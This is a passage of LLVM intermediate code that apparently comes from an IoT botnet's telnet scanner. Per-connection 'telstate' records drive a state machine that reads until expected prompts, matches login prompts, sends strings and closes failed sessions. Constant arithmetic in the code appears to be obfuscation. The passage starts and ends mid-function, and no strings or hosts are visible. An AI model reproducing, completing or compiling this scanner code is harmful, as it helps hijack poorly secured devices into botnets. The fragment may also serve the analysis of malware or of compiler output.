  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1485, i32 0, i32 0
  %1487 = load i32, i32* %1486, align 16
  %1488 = call i32 @sclose(i32 %1487)
  %1489 = load i32, i32* %2, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 2
  store i8 0, i8* %1492, align 8
  %1493 = load i32, i32* %2, align 4
  %1494 = sext i32 %1493 to i64
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1494
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1495, i32 0, i32 3
  store i8 0, i8* %1496, align 1
  br label %1992

; <label>:1497:                                   ; preds = %1461
  %1498 = load i32, i32* %2, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 8
  %1502 = load i8*, i8** %1501, align 8
  %1503 = call i32 @matchPrompt(i8* %1502)
  %1504 = icmp ne i32 %1503, 0
  br i1 %1504, label %1525, label %1505

; <label>:1505:                                   ; preds = %1497
  %1506 = load i32, i32* %2, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1507
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1508, i32 0, i32 8
  %1510 = load i8*, i8** %1509, align 8
  call void @llvm.memset.p0i8.i64(i8* %1510, i8 0, i64 1024, i32 1, i1 false)
  %1511 = load i32, i32* %2, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 0
  %1515 = load i32, i32* %1514, align 16
  %1516 = call i32 @sclose(i32 %1515)
  %1517 = load i32, i32* %2, align 4
  %1518 = sext i32 %1517 to i64
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1518
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1519, i32 0, i32 2
  store i8 0, i8* %1520, align 8
  %1521 = load i32, i32* %2, align 4
  %1522 = sext i32 %1521 to i64
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1522
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1523, i32 0, i32 3
  store i8 1, i8* %1524, align 1
  br label %1992

; <label>:1525:                                   ; preds = %1497
  %1526 = load i32, i32* %2, align 4
  %1527 = sext i32 %1526 to i64
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1527
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1528, i32 0, i32 2
  store i8 7, i8* %1529, align 8
  br label %1530

; <label>:1530:                                   ; preds = %1525
  %1531 = load i32, i32* %2, align 4
  %1532 = sext i32 %1531 to i64
  %1533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1532
  %1534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1533, i32 0, i32 8
  %1535 = load i8*, i8** %1534, align 8
  call void @llvm.memset.p0i8.i64(i8* %1535, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1536:                                   ; preds = %1442
  %1537 = load i32, i32* %2, align 4
  %1538 = sext i32 %1537 to i64
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1538
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1539, i32 0, i32 0
  %1541 = load i32, i32* %1540, align 16
  %1542 = load i32, i32* %2, align 4
  %1543 = sext i32 %1542 to i64
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1543
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1544, i32 0, i32 8
  %1546 = load i8*, i8** %1545, align 8
  %1547 = load i32, i32* %2, align 4
  %1548 = sext i32 %1547 to i64
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1548
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1549, i32 0, i32 7
  %1551 = load i16, i16* %1550, align 16
  %1552 = zext i16 %1551 to i32
  %1553 = call i32 @readUntil(i32 %1541, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1546, i32 1024, i32 %1552)
  %1554 = icmp ne i32 %1553, 0
  br i1 %1554, label %1555, label %1630

; <label>:1555:                                   ; preds = %1536
  %1556 = load i32, i32* %2, align 4
  %1557 = sext i32 %1556 to i64
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1557
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1558, i32 0, i32 6
  store i32 0, i32* %1559, align 4
  %1560 = load i32, i32* %2, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 7
  store i16 0, i16* %1563, align 16
  %1564 = load i32, i32* %2, align 4
  %1565 = sext i32 %1564 to i64
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1565
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1566, i32 0, i32 8
  %1568 = load i8*, i8** %1567, align 8
  %1569 = call i8* @strstr(i8* %1568, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1570 = icmp ne i8* %1569, null
  br i1 %1570, label %1571, label %1591

; <label>:1571:                                   ; preds = %1555
  %1572 = load i32, i32* %2, align 4
  %1573 = sext i32 %1572 to i64
  %1574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1573
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1574, i32 0, i32 8
  %1576 = load i8*, i8** %1575, align 8
  call void @llvm.memset.p0i8.i64(i8* %1576, i8 0, i64 1024, i32 1, i1 false)
  %1577 = load i32, i32* %2, align 4
  %1578 = sext i32 %1577 to i64
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1578
  %1580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1579, i32 0, i32 0
  %1581 = load i32, i32* %1580, align 16
  %1582 = call i32 @sclose(i32 %1581)
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 2
  store i8 0, i8* %1586, align 8
  %1587 = load i32, i32* %2, align 4
  %1588 = sext i32 %1587 to i64
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1588
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1589, i32 0, i32 3
  store i8 0, i8* %1590, align 1
  br label %1992

; <label>:1591:                                   ; preds = %1555
  %1592 = load i32, i32* %2, align 4
  %1593 = sext i32 %1592 to i64
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1593
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1594, i32 0, i32 8
  %1596 = load i8*, i8** %1595, align 8
  %1597 = call i32 @matchPrompt(i8* %1596)
  %1598 = icmp ne i32 %1597, 0
  br i1 %1598, label %1619, label %1599

; <label>:1599:                                   ; preds = %1591
  %1600 = load i32, i32* %2, align 4
  %1601 = sext i32 %1600 to i64
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1601
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1602, i32 0, i32 8
  %1604 = load i8*, i8** %1603, align 8
  call void @llvm.memset.p0i8.i64(i8* %1604, i8 0, i64 1024, i32 1, i1 false)
  %1605 = load i32, i32* %2, align 4
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1606
  %1608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1607, i32 0, i32 0
  %1609 = load i32, i32* %1608, align 16
  %1610 = call i32 @sclose(i32 %1609)
  %1611 = load i32, i32* %2, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1613, i32 0, i32 2
  store i8 0, i8* %1614, align 8
  %1615 = load i32, i32* %2, align 4
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1616
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1617, i32 0, i32 3
  store i8 1, i8* %1618, align 1
  br label %1992

; <label>:1619:                                   ; preds = %1591
  %1620 = load i32, i32* %2, align 4
  %1621 = sext i32 %1620 to i64
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1621
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1622, i32 0, i32 2
  store i8 7, i8* %1623, align 8
  br label %1624

; <label>:1624:                                   ; preds = %1619
  %1625 = load i32, i32* %2, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1627, i32 0, i32 8
  %1629 = load i8*, i8** %1628, align 8
  call void @llvm.memset.p0i8.i64(i8* %1629, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1630:                                   ; preds = %1536
  %1631 = load i32, i32* %2, align 4
  %1632 = sext i32 %1631 to i64
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1632
  %1634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1633, i32 0, i32 0
  %1635 = load i32, i32* %1634, align 16
  %1636 = load i32, i32* %2, align 4
  %1637 = sext i32 %1636 to i64
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1637
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1638, i32 0, i32 8
  %1640 = load i8*, i8** %1639, align 8
  %1641 = load i32, i32* %2, align 4
  %1642 = sext i32 %1641 to i64
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1642
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1643, i32 0, i32 7
  %1645 = load i16, i16* %1644, align 16
  %1646 = zext i16 %1645 to i32
  %1647 = call i32 @readUntil(i32 %1635, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1640, i32 1024, i32 %1646)
  %1648 = icmp ne i32 %1647, 0
  br i1 %1648, label %1649, label %1724

; <label>:1649:                                   ; preds = %1630
  %1650 = load i32, i32* %2, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 6
  store i32 0, i32* %1653, align 4
  %1654 = load i32, i32* %2, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 7
  store i16 0, i16* %1657, align 16
  %1658 = load i32, i32* %2, align 4
  %1659 = sext i32 %1658 to i64
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1659
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1660, i32 0, i32 8
  %1662 = load i8*, i8** %1661, align 8
  %1663 = call i8* @strstr(i8* %1662, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1664 = icmp ne i8* %1663, null
  br i1 %1664, label %1665, label %1685

; <label>:1665:                                   ; preds = %1649
  %1666 = load i32, i32* %2, align 4
  %1667 = sext i32 %1666 to i64
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1667
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1668, i32 0, i32 8
  %1670 = load i8*, i8** %1669, align 8
  call void @llvm.memset.p0i8.i64(i8* %1670, i8 0, i64 1024, i32 1, i1 false)
  %1671 = load i32, i32* %2, align 4
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1672
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1673, i32 0, i32 0
  %1675 = load i32, i32* %1674, align 16
  %1676 = call i32 @sclose(i32 %1675)
  %1677 = load i32, i32* %2, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1678
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1679, i32 0, i32 2
  store i8 0, i8* %1680, align 8
  %1681 = load i32, i32* %2, align 4
  %1682 = sext i32 %1681 to i64
  %1683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1682
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1683, i32 0, i32 3
  store i8 0, i8* %1684, align 1
  br label %1992

; <label>:1685:                                   ; preds = %1649
  %1686 = load i32, i32* %2, align 4
  %1687 = sext i32 %1686 to i64
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1687
  %1689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1688, i32 0, i32 8
  %1690 = load i8*, i8** %1689, align 8
  %1691 = call i32 @matchPrompt(i8* %1690)
  %1692 = icmp ne i32 %1691, 0
  br i1 %1692, label %1713, label %1693

; <label>:1693:                                   ; preds = %1685
  %1694 = load i32, i32* %2, align 4
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1695
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1696, i32 0, i32 8
  %1698 = load i8*, i8** %1697, align 8
  call void @llvm.memset.p0i8.i64(i8* %1698, i8 0, i64 1024, i32 1, i1 false)
  %1699 = load i32, i32* %2, align 4
  %1700 = sext i32 %1699 to i64
  %1701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1700
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1701, i32 0, i32 0
  %1703 = load i32, i32* %1702, align 16
  %1704 = call i32 @sclose(i32 %1703)
  %1705 = load i32, i32* %2, align 4
  %1706 = sext i32 %1705 to i64
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1706
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1707, i32 0, i32 2
  store i8 0, i8* %1708, align 8
  %1709 = load i32, i32* %2, align 4
  %1710 = sext i32 %1709 to i64
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1710
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1711, i32 0, i32 3
  store i8 1, i8* %1712, align 1
  br label %1992

; <label>:1713:                                   ; preds = %1685
  %1714 = load i32, i32* %2, align 4
  %1715 = sext i32 %1714 to i64
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1715
  %1717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1716, i32 0, i32 2
  store i8 7, i8* %1717, align 8
  br label %1718

; <label>:1718:                                   ; preds = %1713
  %1719 = load i32, i32* %2, align 4
  %1720 = sext i32 %1719 to i64
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1720
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1721, i32 0, i32 8
  %1723 = load i8*, i8** %1722, align 8
  call void @llvm.memset.p0i8.i64(i8* %1723, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1724:                                   ; preds = %1630
  %1725 = load i32, i32* %2, align 4
  %1726 = sext i32 %1725 to i64
  %1727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1726
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1727, i32 0, i32 0
  %1729 = load i32, i32* %1728, align 16
  %1730 = load i32, i32* %2, align 4
  %1731 = sext i32 %1730 to i64
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1731
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1732, i32 0, i32 8
  %1734 = load i8*, i8** %1733, align 8
  %1735 = load i32, i32* %2, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1736
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1737, i32 0, i32 7
  %1739 = load i16, i16* %1738, align 16
  %1740 = zext i16 %1739 to i32
  %1741 = call i32 @readUntil(i32 %1729, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1734, i32 1024, i32 %1740)
  %1742 = icmp ne i32 %1741, 0
  br i1 %1742, label %1743, label %1818

; <label>:1743:                                   ; preds = %1724
  %1744 = load i32, i32* %2, align 4
  %1745 = sext i32 %1744 to i64
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1745
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1746, i32 0, i32 6
  store i32 0, i32* %1747, align 4
  %1748 = load i32, i32* %2, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1749
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1750, i32 0, i32 7
  store i16 0, i16* %1751, align 16
  %1752 = load i32, i32* %2, align 4
  %1753 = sext i32 %1752 to i64
  %1754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1753
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1754, i32 0, i32 8
  %1756 = load i8*, i8** %1755, align 8
  %1757 = call i8* @strstr(i8* %1756, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1758 = icmp ne i8* %1757, null
  br i1 %1758, label %1759, label %1779

; <label>:1759:                                   ; preds = %1743
  %1760 = load i32, i32* %2, align 4
  %1761 = sext i32 %1760 to i64
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1761
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1762, i32 0, i32 8
  %1764 = load i8*, i8** %1763, align 8
  call void @llvm.memset.p0i8.i64(i8* %1764, i8 0, i64 1024, i32 1, i1 false)
  %1765 = load i32, i32* %2, align 4
  %1766 = sext i32 %1765 to i64
  %1767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1766
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1767, i32 0, i32 0
  %1769 = load i32, i32* %1768, align 16
  %1770 = call i32 @sclose(i32 %1769)
  %1771 = load i32, i32* %2, align 4
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 2
  store i8 0, i8* %1774, align 8
  %1775 = load i32, i32* %2, align 4
  %1776 = sext i32 %1775 to i64
  %1777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1776
  %1778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1777, i32 0, i32 3
  store i8 0, i8* %1778, align 1
  br label %1992

; <label>:1779:                                   ; preds = %1743
  %1780 = load i32, i32* %2, align 4
  %1781 = sext i32 %1780 to i64
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1781
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1782, i32 0, i32 8
  %1784 = load i8*, i8** %1783, align 8
  %1785 = call i32 @matchPrompt(i8* %1784)
  %1786 = icmp ne i32 %1785, 0
  br i1 %1786, label %1807, label %1787

; <label>:1787:                                   ; preds = %1779
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 8
  %1792 = load i8*, i8** %1791, align 8
  call void @llvm.memset.p0i8.i64(i8* %1792, i8 0, i64 1024, i32 1, i1 false)
  %1793 = load i32, i32* %2, align 4
  %1794 = sext i32 %1793 to i64
  %1795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1794
  %1796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1795, i32 0, i32 0
  %1797 = load i32, i32* %1796, align 16
  %1798 = call i32 @sclose(i32 %1797)
  %1799 = load i32, i32* %2, align 4
  %1800 = sext i32 %1799 to i64
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1800
  %1802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1801, i32 0, i32 2
  store i8 0, i8* %1802, align 8
  %1803 = load i32, i32* %2, align 4
  %1804 = sext i32 %1803 to i64
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1804
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1805, i32 0, i32 3
  store i8 1, i8* %1806, align 1
  br label %1992

; <label>:1807:                                   ; preds = %1779
  %1808 = load i32, i32* %2, align 4
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1809
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1810, i32 0, i32 2
  store i8 7, i8* %1811, align 8
  br label %1812

; <label>:1812:                                   ; preds = %1807
  %1813 = load i32, i32* %2, align 4
  %1814 = sext i32 %1813 to i64
  %1815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1814
  %1816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1815, i32 0, i32 8
  %1817 = load i8*, i8** %1816, align 8
  call void @llvm.memset.p0i8.i64(i8* %1817, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:1818:                                   ; preds = %1724
  %1819 = load i32, i32* %2, align 4
  %1820 = sext i32 %1819 to i64
  %1821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1820
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1821, i32 0, i32 8
  %1823 = load i8*, i8** %1822, align 8
  %1824 = call i64 @strlen(i8* %1823) #10
  %1825 = trunc i64 %1824 to i16
  %1826 = load i32, i32* %2, align 4
  %1827 = sext i32 %1826 to i64
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1827
  %1829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1828, i32 0, i32 7
  store i16 %1825, i16* %1829, align 16
  br label %1830

; <label>:1830:                                   ; preds = %1818
  br label %1831

; <label>:1831:                                   ; preds = %1830
  br label %1832

; <label>:1832:                                   ; preds = %1831
  br label %1833

; <label>:1833:                                   ; preds = %1832
  br label %1834

; <label>:1834:                                   ; preds = %1833
  br label %1835

; <label>:1835:                                   ; preds = %1834
  br label %1836

; <label>:1836:                                   ; preds = %1835
  br label %1837

; <label>:1837:                                   ; preds = %1836
  %1838 = load i32, i32* %2, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1839
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1840, i32 0, i32 6
  %1842 = load i32, i32* %1841, align 4
  %1843 = sub i32 %1842, 820998961
  %1844 = add i32 %1843, 10
  %1845 = add i32 %1844, 820998961
  %1846 = add i32 %1842, 10
  %1847 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1848 = icmp ult i32 %1845, %1847
  br i1 %1848, label %1849, label %1864

; <label>:1849:                                   ; preds = %1837
  %1850 = load i32, i32* %2, align 4
  %1851 = sext i32 %1850 to i64
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1851
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1852, i32 0, i32 0
  %1854 = load i32, i32* %1853, align 16
  %1855 = call i32 @sclose(i32 %1854)
  %1856 = load i32, i32* %2, align 4
  %1857 = sext i32 %1856 to i64
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1857
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1858, i32 0, i32 2
  store i8 0, i8* %1859, align 8
  %1860 = load i32, i32* %2, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1861
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1862, i32 0, i32 3
  store i8 1, i8* %1863, align 1
  br label %1864

; <label>:1864:                                   ; preds = %1849, %1837
  br label %1991

; <label>:1865:                                   ; preds = %72
  %1866 = load i32, i32* %2, align 4
  %1867 = sext i32 %1866 to i64
  %1868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1867
  %1869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1868, i32 0, i32 0
  %1870 = load i32, i32* %1869, align 16
  %1871 = call i64 @send(i32 %1870, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %1872 = icmp slt i64 %1871, 0
  br i1 %1872, label %1873, label %1888

; <label>:1873:                                   ; preds = %1865
  %1874 = load i32, i32* %2, align 4
  %1875 = sext i32 %1874 to i64
  %1876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1875
  %1877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1876, i32 0, i32 0
  %1878 = load i32, i32* %1877, align 16
  %1879 = call i32 @sclose(i32 %1878)
  %1880 = load i32, i32* %2, align 4
  %1881 = sext i32 %1880 to i64
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1881
  %1883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1882, i32 0, i32 2
  store i8 0, i8* %1883, align 8
  %1884 = load i32, i32* %2, align 4
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1885
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1886, i32 0, i32 3
  store i8 1, i8* %1887, align 1
  br label %1992

; <label>:1888:                                   ; preds = %1865
  %1889 = load i32, i32* %2, align 4
  %1890 = sext i32 %1889 to i64
  %1891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1890
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1891, i32 0, i32 2
  store i8 8, i8* %1892, align 8
  br label %1991

; <label>:1893:                                   ; preds = %72
  %1894 = load i32, i32* %2, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1895
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1896, i32 0, i32 0
  %1898 = load i32, i32* %1897, align 16
  %1899 = call i64 @send(i32 %1898, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i32 0, i32 0), i64 9, i32 16384)
  %1900 = icmp slt i64 %1899, 0
  br i1 %1900, label %1901, label %1916

; <label>:1901:                                   ; preds = %1893
  %1902 = load i32, i32* %2, align 4
  %1903 = sext i32 %1902 to i64
  %1904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1903
  %1905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1904, i32 0, i32 0
  %1906 = load i32, i32* %1905, align 16
  %1907 = call i32 @sclose(i32 %1906)
  %1908 = load i32, i32* %2, align 4
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1909
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1910, i32 0, i32 2
  store i8 0, i8* %1911, align 8
  %1912 = load i32, i32* %2, align 4
  %1913 = sext i32 %1912 to i64
  %1914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1913
  %1915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1914, i32 0, i32 3
  store i8 1, i8* %1915, align 1
  br label %1992

; <label>:1916:                                   ; preds = %1893
  %1917 = load i32, i32* %2, align 4
  %1918 = sext i32 %1917 to i64
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1918
